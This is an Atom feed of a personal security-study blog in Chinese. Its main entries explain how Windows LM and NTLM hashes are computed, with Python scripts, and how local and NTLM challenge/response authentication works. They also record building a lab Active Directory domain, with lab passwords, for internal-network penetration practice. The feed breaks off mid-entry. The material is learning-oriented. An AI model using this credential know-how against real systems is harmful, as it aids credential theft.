<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Pan3a&#39;s Blog</title>
  
  
  <link href="https://pan3a.github.io/atom.xml" rel="self"/>
  
  <link href="https://pan3a.github.io/"/>
  <updated>2022-07-11T05:31:43.256Z</updated>
  <id>https://pan3a.github.io/</id>
  
  <author>
    <name>Pan3a</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>语录</title>
    <link href="https://pan3a.github.io/4/"/>
    <id>https://pan3a.github.io/4/</id>
    <published>2023-02-23T08:21:47.000Z</published>
    <updated>2022-07-11T05:31:43.256Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文主要记录了自己摘抄的一些自认为写得很好的句子。</li></ul><span id="more"></span><ul><li>我告诉你我喜欢你，并不是一定要和你在一起，只是希望今后的你，在遭遇人生低谷的时候，不要灰心，至少曾经有人被你的魅力所吸引，曾经是，以后也会是。—-村上村树</li></ul>]]></content>
    
    
    <summary type="html">随笔</summary>
    
    
    
    <category term="essay" scheme="https://pan3a.github.io/categories/essay/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透之Windows认证（二）</title>
    <link href="https://pan3a.github.io/6/"/>
    <id>https://pan3a.github.io/6/</id>
    <published>2022-06-26T06:01:22.000Z</published>
    <updated>2022-07-12T04:34:29.275Z</updated>
    
    <content type="html"><![CDATA[<ul><li>为什么有这篇文章呢，因为我们知道平常的Web系统有注册、登录是依赖数据库和后端的加密解密算法。那么Windows系统登录的时候是如何进行身份验证的呢，是否也有一个类似数据库的东西，或者就是一个单纯的文本呢？</li></ul><span id="more"></span><ul><li>参考–<a class="link"   href="https://www.anquanke.com/post/id/193149" >Windows内网协议学习NTLM篇之NTLM基础介绍<i class="fas fa-external-link-alt"></i></a></li><li>Windows也有一个类似于数据的东西，存放在<code>%SystemRoot%\system32\config\sam</code>，里面存放着用户的凭证信息，当然这肯定不是明文，不然Windows这么写也太不安全了。这里的加密算法不同于常见的MD5，加密后的数据有两种分别为<code>LM Hash</code>和<code>NTLM Hash</code>。</li></ul><h2 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h2><ul><li><p>LM Hash全称<code>LAN Manager Hash</code>，由IBM设计一般用于<code>Windows XP</code>、<code>Windows 2000</code>、<code>Windows 2003 </code>这一类系统中。加密算法如下。</p></li><li><p>密码长度不能超过14个字符。</p></li><li><p>密码转换为大写，再转换成16进制的字符串，没有28位长度的，在右边加0。</p></li><li><p>再将十六进制的字符串分为两组14位的字符串。</p></li><li><p>再将这两组14位的字符串进行十六进制转二进制，转换完成后不满足56位的在左边加0。</p></li><li><p>两部分分别划分为每组七位，在其末尾加0，再分别转换为十六进制。</p></li><li><p>最后将这两组数据作为DES加密所需的Key，<code>KGS!@#$%</code>作为需加密的字符，将DES加密后的数据依次拼接。</p></li><li><p>这里借用<a class="link"   href="https://blog.zjun.info/tech/from-windows-local-authentication-to-obtaining-hash/" >zjun<i class="fas fa-external-link-alt"></i></a>的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Key</span>):</span></span><br><span class="line">    k = des(Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ZeroPadding</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    passwd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你的输入是:&#x27;</span>, passwd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;转化为大写:&#x27;</span>, passwd.upper())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写，并转换为 16 进制字符串</span></span><br><span class="line">    passwd = codecs.encode(passwd.upper().encode(), <span class="string">&#x27;hex_codec&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;转为 hex:&#x27;</span>, passwd.decode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足 28 位，用 0 在右边补全</span></span><br><span class="line">    passwd_len = <span class="built_in">len</span>(passwd)</span><br><span class="line">    <span class="keyword">if</span> passwd_len &lt; <span class="number">28</span>:</span><br><span class="line">        passwd = passwd.decode().ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;补齐 28 位:&#x27;</span>, passwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 28 位的密码被分成两个 14 位部分</span></span><br><span class="line">    PartOne = passwd[<span class="number">0</span>:<span class="number">14</span>]</span><br><span class="line">    PartTwo = passwd[<span class="number">14</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;两组 14 位的部分:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分分别转换成比特流，并且长度为 56 位，长度不足用 0 在左边补齐长度</span></span><br><span class="line">    PartOne = <span class="built_in">bin</span>(<span class="built_in">int</span>(PartOne, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    PartTwo = <span class="built_in">bin</span>(<span class="built_in">int</span>(PartTwo, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;两组 56 位比特流:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 两组分别再分为 7 位一组末尾加 0，再分别组合成新的字符</span></span><br><span class="line">    PartOne = ZeroPadding(PartOne)</span><br><span class="line">    PartTwo = ZeroPadding(PartTwo)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;两组再 7 位一组末尾加 0:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 两组数据转 hex</span></span><br><span class="line">    PartOne = <span class="built_in">hex</span>(<span class="built_in">int</span>(PartOne, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    PartTwo = <span class="built_in">hex</span>(<span class="built_in">int</span>(PartTwo, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == PartTwo:</span><br><span class="line">        PartTwo = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;两组转为 hex:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 16 位的二组数据，分别作为 DES key 为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LMOne = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, binascii.a2b_hex(PartOne)).decode()</span><br><span class="line">    LMTwo = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, binascii.a2b_hex(PartTwo)).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;两组 DES 加密结果:&#x27;</span>, LMOne, LMTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组 DES 加密后的编码拼接，得到 LM HASH 值。</span></span><br><span class="line">    LM = LMOne + LMTwo</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;LM hash:&#x27;</span>, LM)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/jc9E60.png"                      alt="image.png"                ></p></li><li><p>可以看出密码长度小于7时，后面加密的数据是固定的，均为aad3b435b51404ee，因此其加密是不安全的。</p><h2 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a>NTML Hash</h2></li><li><p>NTML Hash全称<code>NT LAN Manager</code> ， 目前 Windows 基本都使用 NTLM hash ，一个<code>32</code>位长度的字符串。支持Net NTLM认证协议及本地认证过程中的关键凭据。加密算法如下：</p></li><li><p>密码转换为十六进制</p></li><li><p><code>Unicode</code>编码</p></li><li><p><code>MD4</code>加密</p></li><li><p>Python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, sys.argv[<span class="number">1</span>].encode(<span class="string">&quot;utf-16le&quot;</span>)).digest()).decode())</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/jc9Alq.png"                      alt="image.png"                ></p></li><li><p><code>123456</code>经过加密后则为<code>32ed87bdb5fdc5e9cba88547376818d4</code>。</p><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2></li><li><p><code>winlogon.exe</code> -&gt; 接收用户密码 -&gt; <code>lsass.exe</code> -&gt; 比对sam表。</p></li><li><p>winlogon就是登陆界面，接受用户密码之后会发送明文到<code>lsass.exe</code>，<code>lsass.exe</code>会存储一份明文，然后加密明文和sam表的hash做比对，判断是否可以登陆。</p></li><li><p>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</p></li><li><p>这里注意如果打了补丁<code>KB2871997</code>，或者机器是<code>win2012</code>之后，则不会保存明文密码了。</p><h2 id="NTLM认证协议"><a href="#NTLM认证协议" class="headerlink" title="NTLM认证协议"></a>NTLM认证协议</h2></li><li><p>什么是<code>NTLM</code>认证协议呢？和<code>NTLM Hash</code>又有什么区别呢？<code>NTLM</code>是一种网络认证协议，它是基于挑战（Chalenge）&#x2F;响应（Response）认证机制的一种认证模式。NTLM 网络认证协议是以<code> NTLM Hash</code> 作为根本凭证进行认证的协议。</p></li><li><p>在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。</p></li><li><p>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</p></li><li><p>早期SMB协议在网络上传输明文口令。后来出现LAN Manager Challenge&#x2F;Response验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了<code>NTLM</code>以及<code>Kerberos</code>。</p></li><li><p>认证流程分为三部分，分别是：<code>协商</code>、<code>质询</code>、<code>身份验证</code>。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/jc9kpn.jpg"                                     ></p><h3 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h3><ul><li><p>客户端向服务器发送协商请求，包含用户名、密码、认证协议版本等信息。</p><h3 id="质询"><a href="#质询" class="headerlink" title="质询"></a>质询</h3></li><li><p>服务器接收到客户端发送到协商信息，这时服务器会生成一个随机数，叫做<code>challenge</code>，这里的不同的协议随机数长度不同，NTLM V1是8位，NTLM V2是16位。</p></li><li><p>服务器将登陆的用户对应的<code>NTLM Hash</code>加密<code>challenge</code>，得到<code>Net NTLM Hash</code>，和生成的<code>challenge</code>一起发送给客户端。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3></li><li><p>客户端收到challenge后，将用户的hash与challenge进行加密运算得到resposne，将username、response、challenge发送给服务器，最后服务器进行校验返回认证结果。</p><h3 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h3></li><li><p>知道了基本原理自己实战试试</p></li></ul>]]></content>
    
    
    <summary type="html">Windows认证协议</summary>
    
    
    
    <category term="内网渗透" scheme="https://pan3a.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透之域环境搭建（一）</title>
    <link href="https://pan3a.github.io/5/"/>
    <id>https://pan3a.github.io/5/</id>
    <published>2022-05-26T05:02:38.000Z</published>
    <updated>2022-07-11T08:40:43.009Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文主要记录了自己学习《内网安全攻防-渗透测试指南》第一章，主要介绍了内网渗透的会遇到的一些事物的概念和作用。</li></ul><span id="more"></span><ul><li><p>内网渗透测试，顾名思义就是对内网进行渗透测试，然后这里的渗透测试和平常的<code>Web渗透</code>不太一样，但是大体的思路都是一致的，都是先针对目标进行信息搜集，因为渗透的本质就是信息搜集的嘛。</p></li><li><p>内网安全攻防，那肯定要先明白啥子是内网的嘛。我觉得内网的话应该相对而言吧，比如一所学校，学校有自己的官网，然后大家都可以在互联网上直接访问到，有些资产架设在内网中，需要特定的VPN或者在学校里面才能访问，这些需要VPN访问的资产我就称它为内网。互联网上有的资产只占小部分，重要的内容大部分都设置在内网当中的，然后渗透的时候Web渗透只是开始，内网渗透合起来才是完整的渗透测试。</p></li></ul><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><ul><li><p>工作组就像一个类似于学校的社团，学校可能有街舞社、篮球社、吉他社等等。然后你是这个学校的一名学生，你可以参加这些社团，也可以从某个社团中退出来、当然还可以创建自己的社团。工作组也是一样的，一台电脑就是一个学生，一个内网就是一个学校。你可以加入某个工作组、退出某个工作组、创建某个工作组。这样如果找街舞社的张三同学，那么去街舞社就可以了，更方便管理。</p></li><li><p>加入工作组—更改工作组组名为想加入的工作组组名即可，创建工作组—更改的工作组组名如果不存在该工作组则会重新创建一个工作组，退出工作组—更改工作组组名即可。</p></li><li><p><code>Windows10</code>更改工作组组名：查看高级系统设置-&gt;计算机名-&gt;更改，更改完重启电脑就可以了</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sq2T.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sT5q.png"                      alt="image.png"                ></p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><ul><li><p>域的话当然要有一个域环境了，虽然网上有域环境，但是我觉得纸上得来终觉浅，绝知此事要躬行。因此我们还是自己手动搭建一个域环境吧。</p></li><li><p><a class="link"   href="https://xyzsec.cn/2021/09/21/nei-wang-shen-tou-ji-chu-ji-huan-jing-da-jian/" >https://xyzsec.cn/2021/09/21/nei-wang-shen-tou-ji-chu-ji-huan-jing-da-jian/<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link"   href="https://www.freebuf.com/articles/network/284730.html" >https://www.freebuf.com/articles/network/284730.html<i class="fas fa-external-link-alt"></i></a></p></li><li><p><a class="link"   href="https://www.f12bug.com/archives/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" >https://www.f12bug.com/archives/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA<i class="fas fa-external-link-alt"></i></a>    域环境搭建</p></li><li><p>加入域的时候可能会存在于域无法建立连接     因此更改<code>C:\Windows\System32\drivers\etc\hosts</code>文件</p></li><li><p>不知道为啥突然换了个网络，就能加入域了。</p></li><li><p>放弃了，自己搭建环境有超级多的问题</p></li><li><p>为什么有域这个东西呢？比如说一个网络中有中有200台主机，有个人Alan可以登录其中任何一台计算机，那么我们就要在这200台计算机中存储Alan的用户名和密码。一旦这个人想更改密码，那么我们就得更在这200台计算机上更改。这样是不是太麻烦了，于是乎就有了域这个环境。</p></li><li><p>域是一个有安全边界的计算机集合（一个域内的用户无法访问另一个域内的数据），用户想要访问域内资源，需要用合法的身份登录，并判断其权限可以访问哪些资源。</p><h2 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h2></li><li><p>虽然搭建过程可能会出现莫名其妙的错误，但是我还是一步一步来嘛。</p></li><li><p>解决win2012安装VM Tools为灰色，将<code>/Applications/VMware Fusion.app/Contents/Library/isoimages</code>中的<code>windows.iso</code>镜像复制到虚拟机路径，设置CD&#x2F;DVD镜像选择所复制到I2SO文件。</p><table><thead><tr><th>服务器</th><th>IP</th><th>用户名</th><th>密码</th><th>DSRM</th></tr></thead><tbody><tr><td>windows 2012</td><td>192.168.1.10</td><td>win12</td><td></td><td></td></tr><tr><td>administrator</td><td>win2012@2022</td><td></td><td></td><td></td></tr><tr><td>win2012@admin</td><td>win2012@dsrm</td><td></td><td></td><td></td></tr><tr><td>windows 2008</td><td>192.168.1.20</td><td>win8</td><td></td><td></td></tr><tr><td>administartor</td><td></td><td></td><td></td><td></td></tr><tr><td>hack.com\win2008</td><td>win2008@2022</td><td></td><td></td><td></td></tr><tr><td>win2008@admin</td><td></td><td></td><td></td><td></td></tr><tr><td>win8@2022..</td><td></td><td></td><td></td><td></td></tr><tr><td>windows 2007</td><td>192.168.1.30</td><td>win7</td><td></td><td></td></tr><tr><td>administrator</td><td>win2007@2022..</td><td></td><td></td><td></td></tr></tbody></table></li></ul><h3 id="域控制器安装"><a href="#域控制器安装" class="headerlink" title="域控制器安装"></a>域控制器安装</h3><ul><li>这里我将域控制器安装在Windows 2012，首先设置IP，设置<code>administrator</code>用户密码。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6soan.png"                      alt="image.png"                ></p><ul><li>这里更改完计算机名字后，需要重启计算机。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sIVs.png"                      alt="image.png"                ></p><ul><li>安装<code>DNS服务器</code>和<code>Active Directory(AD）</code>。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6s4bj.png"                      alt="image.png"                ></p><ul><li>安装成功。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sHP0.png"                      alt="image.png"                ></p><ul><li>将其升级为域控制器</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sLxU.png"                      alt="image.png"                ></p><ul><li>设置根域名</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sbGV.png"                      alt="image.png"                ></p><ul><li>设置目录还原模式密码</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sXMF.png"                      alt="image.png"                ></p><ul><li>这里虽然会提示DNS服务警告，但是不用管，然后一直下一步下一步。</li><li>一直到先决条件检查。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6svqJ.png"                      alt="image.png"                ></p><ul><li>然后点击安装，最后安装完成，然后会重启服务器。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6sjr4.png"                      alt="image.png"                ></p><ul><li>创建Active Directory用户</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6ySaR.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6ypI1.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6szZ9.png"                      alt="image.png"                ></p><ul><li>然后输入密码<code>win2008</code>、 <code>win8@2022..</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yCPx.png"                      alt="image.png"                ></p><h3 id="windows2008-R2"><a href="#windows2008-R2" class="headerlink" title="windows2008 R2"></a>windows2008 R2</h3><ul><li>这里无法安装VM Tools，安装显示不信任此安装  驱动无法安装  百度了哈需要补丁    安装软件时需要验证域管理员用户</li><li><a class="link"   href="https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2019/09/windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu" >https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2019/09/windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu<i class="fas fa-external-link-alt"></i></a></li><li>更改IP和隶属于域和计算机名</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yFxO.png"                      alt="image.png"                ></p><h3 id="windows2007"><a href="#windows2007" class="headerlink" title="windows2007"></a>windows2007</h3><ul><li><p>和上面一样的操作，配置IP，更改计算机名。</p><h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2></li><li><p><code>Domain Controller</code>简称<code>DC</code>，域中一台管理域环境的计算机，类似于小区的保安门禁系统。进入小区需要进行身份认证，来判断你是否属于这个小区，可以访问小区内的那些资源。</p></li><li><p>域控制器保存着用户的用户名、密码、个人信息等都保存在一个活动目录（AD）中，类似于数据库。</p><h2 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h2></li><li><p>一般来说一个域中至少存在两台域服务器，一个作为域控制器，另一台作为备份DC。一台瘫痪了，另一台可以工作，这样域环境就还可以使用。</p><h2 id="父域-amp-子域"><a href="#父域-amp-子域" class="headerlink" title="父域&amp;子域"></a>父域&amp;子域</h2></li><li><p>一个公司有很多下属，在不同的位置。这样就出现了父域子域，每个分公司可以自己定义规则来管理自己所处的子域。而总部只需要管理下属的子域即可。这样信息就不会交叉，网络请求也会很快。</p></li><li><p>如中国通信服务，下级包含重庆通信服务、浙江通信服务、四川通信服务等。</p><h2 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h2></li><li><p>前面说了，一个域的域管理员只能管理当前自己所处的域，那么要访问其他域中的资源应该怎么办呢，则需要简历信任关系（Trust Relation）。域树内的父域与子域可以跨网络分配文件和打印机等物理设备。</p></li><li><p>域树中的父域与子域采用类似子域名的形式。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yPG6.png"                      alt="image.png"                ></p><h2 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h2><ul><li>公司被吞并了，需要加入其他公司的网络中。因此需要多个域树建立信任关系成域森林。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yiRK.png"                      alt="image.png"                ></p><h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><ul><li><p>域名服务器（<code>Domain Name Server</code>）实现域名与IP互相转换的服务器。一般来说DNS服务器就是域控制器，DNS服务器通常和域控制器在同一台计算机上。</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2></li><li><p><code>Active Directory(AD）</code>活动目录，指域环境中提供目录服务的组件。</p></li><li><p>我认为活动目录就是将内网的资源形成一个索引的字典吧，可以将我们需要访问的数据快速定位。</p></li><li><p>包含以下功能</p></li><li><p>账号集中管理：所有账号存储在服务器中，以便执行命令和重置密码；</p></li><li><p>软件集中管理：统一推送软件(软件安装)，安装网络打印机(硬件设备)；</p></li><li><p>环境集中管理：统一客户端界面(统一桌面不知)&#x2F;IE(安全性策略)&#x2F;…等设置；</p></li><li><p>增强安全性：统一部署杀毒软件和病毒扫描任务&#x2F;集中管理用户的计算机权限&#x2F;统一制定用户密码策略等；</p></li><li><p>更可靠，更短的宕机时间：利用活动目录控制用户方位权限</p></li><li><p>活动目录是微软提供的统一管理平台，ISA&#x2F;Exchange&#x2F;SMS等都依赖这个平台</p><h2 id="域控制器与活动目录"><a href="#域控制器与活动目录" class="headerlink" title="域控制器与活动目录"></a>域控制器与活动目录</h2></li><li><p>活动目录就类似于一个数据库，而数据库则是要安装在计算机上的，那个计算机安装了活动目录，那么这个计算机就是域控制器。</p><h2 id="安全域"><a href="#安全域" class="headerlink" title="安全域"></a>安全域</h2></li><li><p>划分安全域则是将一组安全等级相同的计算机划入同一个网段。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yEse.png"                      alt="image.png"                ></p><ul><li><p><strong>安全级别最高的内网</strong></p></li><li><p><strong>安全级别中等的DMZ区域</strong></p></li><li><p><strong>安全级别最低的外网</strong></p></li><li><p>内网的一般策略如下</p></li><li><p>内网可以访问外网：满足内网用户上网查阅资料办公的需求；</p></li><li><p>内网可以访问DMZ：是管理者可以管理DMZ区域当中的服务器设备；</p></li><li><p>外网不能访问内网：内网存储公司重要资料，可以使用VPN来访问；</p></li><li><p>外网可以访问DMZ：DMZ区域中的服务器对外界提供服务，需要由防火墙来完成对外地址到服务器实际地址的转换；</p></li><li><p>DMZ不能访问内网：当服务器沦陷保护内网主机不受入侵；</p></li><li><p>DMZ不能访问外网：限制入侵黑客的通信隧道，邮件服务器除外；</p><h2 id="域计算分类"><a href="#域计算分类" class="headerlink" title="域计算分类"></a>域计算分类</h2></li><li><p>域控制器：用于管理所有的网络访问，包括登录服务器，访问共享目录及资源</p></li><li><p>成员服务器：安全了服务器系统并加入了域，主要任务是提供服务</p></li><li><p>客户机：安装了个人系统的计算机并加入了域</p></li><li><p>独立服务器：能够对外提供服务但是没有加入域</p><h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2></li><li><p><code>有点模糊不清，需要再仔细学习一下</code>。</p></li><li><p>组是用户账号的集合，通过组可以更好的管理用的权限；域环境有：<code>本地组、全局组、通用组</code>。给每一个不同的组分配不同的权限，然后将用户加入特定的组就不用给每个用户分配不同的权限了。</p><table><thead><tr><th>组类型</th><th>主要作用</th><th>嵌套关系</th></tr></thead><tbody><tr><td>本地组</td><td>授予本地域内资源的访问权限</td><td>本地组不能嵌套在其他组中</td></tr><tr><td>全局组</td><td>实现单域用户访问多域资源</td><td>全局组可以嵌套在其他组中</td></tr><tr><td>通用组</td><td>实现域森林的跨域访问资源</td><td>通用组成员可以来自域森林中的任何域的用户&#x2F;全局组和其他通用组</td></tr></tbody></table></li></ul><p>知识点：域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林；</p><h2 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h2><ul><li><p>A-G-DL-P策略是指将用户账号添加到全局组中，将全局组添加到与本地组中，然后为域本地组分配资源权限；</p></li><li><p>A：用户账号（Account）</p></li><li><p>G：全局组（Global Group）</p></li><li><p>U：通用组（Univresal Group）</p></li><li><p>DL：域本地组（Domain Local 